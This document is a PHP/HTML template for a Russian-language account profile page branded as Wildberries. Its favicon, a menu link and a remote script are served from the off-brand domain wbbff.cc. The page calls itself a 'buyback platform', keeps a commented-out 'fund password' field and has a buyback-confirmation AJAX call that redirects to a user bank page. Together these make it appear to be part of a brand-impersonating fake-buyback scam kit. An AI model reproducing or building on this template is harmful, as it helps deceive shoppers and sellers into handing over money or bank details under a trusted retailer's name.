<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>мой профайл - Wildberries</title>
	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
	<meta name="description"
		content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
	<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<div class="pagetop">
		<div class="fh"><a href="<?php  echo route("profile") ?>"></a></div>
		<div>мой профайл</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
		<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> -->
	</div>
	<div class="main">
		<form method="post" id="form">
			<div class="zc_box2">
				<div class="zc_list sk_box">
					<a href="">
						<span class="sk_name">ФИО</span>
						<div class="info_tt"></div>
						<i></i>
					</a>
				</div>
				<div class="zc_list sk_box">
					<a href="">
						<span class="sk_name">Номер телефона</span>
						<div class="info_tt">798****7384</div>
						<i></i>
					</a>
				</div>
				<!-- 		<div class="zc_list sk_box">
			<a href="user.php?mod=setting&act=email">
				<span class="sk_name">Email</span>
				<div class="info_tt"></div>
				<i></i>
			</a>
		</div> -->
				<div class="zc_list sk_box">
					<a href="<?php  echo route("profile.change_password") ?>">
						<span class="sk_name">войти пароль</span>
						<div class="info_tt">изменить</div>
						<i></i>
					</a>
				</div>
				<!-- 		<div class="zc_list sk_box">
			<a href="user.php?mod=setting&act=paypw">
				<span class="sk_name">фонды пароль</span>
				<div class="info_tt">изменить</div>
				<i></i>
			</a>
		</div> -->
			</div>
		</form>
	</div>
	<div class="fb_btn1"><a href="<?php echo route("auth.logout")?>">выйти</a></div>
	<script type="text/javascript">
		function user_logout() {
			app_getinfo('user.php?mod=do&act=logout', function (json) {

			});
			app_open('user.php?mod=do&act=login');
		}
	</script>
	<style type="text/css">
		.info_tt {
			text-align: right
		}
	</style>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
	<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
	<script type="text/javascript">
		//顶部菜单点击
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			}
			else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function () {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Определить выкуп этого Заказ？",
				btn: ["OK", "Отмена"],
				shadeClose: false,
				yes: function () {

					/*layer.open({
						content: '你点了确认',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function (res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function () {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function () {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}    
	</script>

</body>

</html>